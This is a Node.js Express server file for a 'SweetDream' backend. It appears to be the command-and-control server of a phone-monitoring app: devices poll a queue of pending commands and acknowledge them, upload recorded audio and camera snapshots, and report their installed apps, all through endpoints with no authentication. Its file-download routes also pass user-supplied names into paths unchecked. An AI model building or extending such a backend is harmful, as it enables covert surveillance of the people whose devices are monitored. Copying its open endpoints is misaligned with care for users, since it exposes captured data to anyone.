// server.js — SweetDream backend (updated)
const express = require("express");
const bodyParser = require("body-parser");
const Database = require("better-sqlite3");
const { v4: uuidv4 } = require("uuid");
const admin = require("firebase-admin");
const multer = require("multer");
const path = require("path");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;

// ================== INIT ==================
app.use(bodyParser.json());

// SQLite DB file (can override via env)
const DB_FILE = process.env.DB_FILE || "sweetdream.db";
const db = new Database(DB_FILE);

// Ensure tables exist
db.prepare(`
  CREATE TABLE IF NOT EXISTS events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT,
    data TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

db.prepare(`
  CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    commandId TEXT,
    commandType TEXT,
    payload TEXT,
    status TEXT,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    deliveredAt DATETIME
  )
`).run();

console.log("✅ SQLite (better-sqlite3) initialized");

// ================== Firebase init (robust) ==================
function loadFirebaseServiceAccount() {
  // 1) Base64 JSON (safe for environment variables that strip newlines)
  if (process.env.FIREBASE_SA_BASE64) {
    try {
      const decoded = Buffer.from(process.env.FIREBASE_SA_BASE64, "base64").toString();
      return JSON.parse(decoded);
    } catch (err) {
      console.error("❌ Failed to parse FIREBASE_SA_BASE64:", err.message);
    }
  }

  // 2) Raw JSON in FIREBASE_SA
  if (process.env.FIREBASE_SA) {
    const val = process.env.FIREBASE_SA.trim();
    // if it looks like JSON
    if (val.startsWith("{")) {
      try {
        return JSON.parse(val);
      } catch (err) {
        console.error("❌ Failed to parse FIREBASE_SA JSON:", err.message);
      }
    }
    // if it's a path (not recommended on Render), try to read file
    try {
      if (fs.existsSync(val)) {
        const txt = fs.readFileSync(val, "utf8");
        return JSON.parse(txt);
      }
    } catch (err) {
      // ignore
    }
  }

  // 3) Local fallback for development (file at repo root)
  const localPath = path.join(__dirname, "firebase-service-account.json");
  if (fs.existsSync(localPath)) {
    try {
      const txt = fs.readFileSync(localPath, "utf8");
      return JSON.parse(txt);
    } catch (err) {
      console.error("❌ Failed to parse local firebase-service-account.json:", err.message);
    }
  }

  return null;
}

try {
  const serviceAccount = loadFirebaseServiceAccount();
  if (serviceAccount) {
    admin.initializeApp({
      credential: admin.credential.cert(serviceAccount),
    });
    console.log("✅ Firebase Admin initialized");
  } else {
    console.warn(
      "⚠️ Firebase Admin NOT initialized — no service account found. Set FIREBASE_SA (JSON) or FIREBASE_SA_BASE64 (base64 JSON) in environment."
    );
  }
} catch (err) {
  console.error("⚠️ Firebase init failed:", err && err.message ? err.message : err);
}

// ================== HEALTH ==================
app.get("/health", (req, res) => {
  res.json({ status: "ok", time: new Date().toISOString() });
});

// ================== EVENTS ==================
app.post("/events", (req, res) => {
  try {
    const { type, data } = req.body;
    db.prepare("INSERT INTO events (type, data) VALUES (?, ?)").run(
      type,
      typeof data === "string" ? data : JSON.stringify(data)
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get("/events", (req, res) => {
  try {
    const rows = db
      .prepare("SELECT * FROM events ORDER BY id DESC LIMIT 200")
      .all();
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================== COMMANDS ==================
app.post("/commands", (req, res) => {
  try {
    const { commandType, payload } = req.body;
    const commandId = uuidv4();
    db.prepare(
      "INSERT INTO commands (commandId, commandType, payload, status) VALUES (?, ?, ?, ?)"
    ).run(commandId, commandType, JSON.stringify(payload || {}), "pending");
    res.json({ commandId, status: "pending" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/commands/pending", (req, res) => {
  try {
    const rows = db
      .prepare("SELECT * FROM commands WHERE status = 'pending' ORDER BY id ASC")
      .all();
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/commands/:id/ack", (req, res) => {
  try {
    const { id } = req.params;
    db.prepare(
      "UPDATE commands SET status = ?, deliveredAt = datetime('now','localtime') WHERE commandId = ?"
    ).run("delivered", id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.delete("/commands/cleanup", (req, res) => {
  try {
    const stmt = db.prepare(
      "DELETE FROM commands WHERE status = 'delivered' AND createdAt < datetime('now','-7 days')"
    );
    const result = stmt.run();
    res.json({ success: true, deleted: result.changes });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================== UPLOAD / LISTING ==================
const audioStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(__dirname, "uploads", "audio");
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    cb(null, "upload_" + Date.now() + path.extname(file.originalname));
  },
});
const uploadAudio = multer({ storage: audioStorage });

app.post("/upload/audio", uploadAudio.single("file"), (req, res) => {
  if (!req.file)
    return res.status(400).json({ success: false, error: "No file uploaded" });
  res.json({ success: true, path: req.file.path });
});

app.get("/download/audio/:filename", (req, res) => {
  const filePath = path.join(__dirname, "uploads", "audio", req.params.filename);
  if (!fs.existsSync(filePath))
    return res.status(404).json({ success: false, error: "File not found" });
  res.download(filePath);
});

app.get("/list/audio", (req, res) => {
  const dir = path.join(__dirname, "uploads", "audio");
  if (!fs.existsSync(dir)) return res.json([]);
  const files = fs.readdirSync(dir)
    .map(f => {
      const stat = fs.statSync(path.join(dir, f));
      return { name: f, url: `/download/audio/${f}`, mtime: stat.mtimeMs };
    })
    .sort((a,b) => b.mtime - a.mtime);
  res.json(files);
});

// Camera upload/list
const cameraStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(__dirname, "uploads", "camera");
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    cb(null, "snap_" + Date.now() + path.extname(file.originalname));
  },
});
const uploadCamera = multer({ storage: cameraStorage });

app.post("/upload/camera", uploadCamera.single("file"), (req, res) => {
  if (!req.file)
    return res.status(400).json({ success: false, error: "No file uploaded" });
  res.json({ success: true, path: req.file.path });
});

app.get("/list/camera", (req, res) => {
  const dir = path.join(__dirname, "uploads", "camera");
  if (!fs.existsSync(dir)) return res.json([]);
  const files = fs.readdirSync(dir)
    .map(f => {
      const stat = fs.statSync(path.join(dir, f));
      return { name: f, url: `/download/camera/${f}`, mtime: stat.mtimeMs };
    })
    .sort((a,b) => b.mtime - a.mtime);
  res.json(files);
});

app.get("/download/camera/:filename", (req, res) => {
  const filePath = path.join(__dirname, "uploads", "camera", req.params.filename);
  if (!fs.existsSync(filePath))
    return res.status(404).json({ success: false, error: "File not found" });
  res.download(filePath);
});

// ================== APPS (device reports apps via events) ==================
app.get("/apps", (req, res) => {
  try {
    const rows = db
      .prepare("SELECT * FROM events WHERE type = 'apps:report' ORDER BY id DESC LIMIT 1")
      .all();

    if (rows.length === 0) return res.json([]);

    // rows[0].data may be a JSON string of an object { apps: [...] } or an array
    let latest = [];
    try {
      const parsed = JSON.parse(rows[0].data || "[]");
      latest = Array.isArray(parsed) ? parsed : parsed.apps || [];
    } catch {
      latest = [];
    }
    res.json(latest);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================== START SERVER ==================
app.listen(PORT, () => {
  console.log(`🚀 SweetDream Backend running at http://localhost:${PORT}`);
});
